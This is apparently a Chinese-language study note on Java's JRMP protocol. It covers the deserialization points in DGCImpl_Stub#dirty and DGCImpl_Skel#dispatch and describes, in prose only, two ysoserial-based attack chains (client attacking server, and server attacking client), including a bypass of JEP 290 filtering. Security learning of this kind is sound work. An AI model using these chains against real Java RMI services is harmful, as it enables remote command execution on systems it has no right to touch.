Java JRMP学习

JRMP

概述

Java Remote Method Protocol，Java远程方法协议。

用于查看和引用远程对象的协议，是运行在RMI之下，TCP/IP之上的线路层协议。

DGCImpl_Stub和DGCImpl_Skel

前面在RMI的学习中，基本都是围绕RegistryImpl_Stub和RegistryImpl_Skel来尝试攻击，在RMI学习中还提到了一个攻击方式：DGC。

通过DGCImpl来实现攻击的也有两种，DGCImpl_Stub#dirt（服务端攻击客户端），还有DGCImpl_Skel#dispatch（客户端攻击服务端），简单说明一下这两个方法存在的漏洞：

  • DGCImpl_Skel#dispatch()：

存在switch/case（分别为clean()和dirty()），以clean()为例：

存在反序列化的点。

  • DGCImpl_Stub#dirt()：

也是很熟悉的代码了，这里的invoke()方法起传输数据的作用。存在反序列化的点。这里就可以存在服务端打客户端，当然也可以客户端打服务端，毕竟客户端传输数据过去后服务端也是会反序列化数据的，点其实也就在于前面说的DGCImpl_Skel#dispatch()方法处。

这个恶意对象就是这里payloadObject

攻击

结合前面程序分析，可以简单理出如下两种攻击方式

第一种攻击方式（客户端打服务端）

思路

在前面payload/JRMPListener的分析中，我们可以返回一个“UnicastRemoteObject类实例”，并且在yso的运行下这个对象将会被序列化传输。

当某个受攻击机反序列化这个类时，会调用到listen()方法开启我们指定的端口。然后我们就可以通过exploit/JRMPClient去发送攻击载荷，最终在存在漏洞的服务器上进行反序列化操作。

主要攻击点

DGCImpl_Skel#dispatch() 。 也是很好理解的，前面分析过会反序列化UnicastRemoteObject类，会开启监听，并且自然会调用到ObjectTable类的putTarget()方法，就会有DGCImpl_Stub和DGCImpl_Skel的生成。

第二种攻击方式（服务端打客户端）

思路

都是打组合拳，挺有意思的。这里的payload/JMPClient会返回一个代理对象，代理的就是UnicastRef类对象，所以当反序列化这个代理对象的时候同样会反序列化UnicastRef类对象，这个反序列化过程也是分析过的，会调用到DGCImpl_Stub类的dity()方法，发送一个请求。

然后就可以使用exploit/JRMPListener来进行监听，当被攻击方反序列化前面paylaod/JRMPClient返返回给它的对象，就会发送请求使得我们的exploit/JRMPListener接受到请求并返回给被攻击方恶意序列化数据，从而达到命令执行。

主要攻击点

DGCImpl_Stub#dirt() ，粘过来一下图片：

很好理解，就是这里invoke()传输数据后，后面的readObject()触发反序列化。

这个服务端打客户端的类型比起客户端打服务端的类型会更加的常用，一方面是外连，另一方面更多的因为是该 exploit/JRMPListener+payloads/JRMPClient 还存在绕过 jep290 的限制，所以往往会更加的通用。
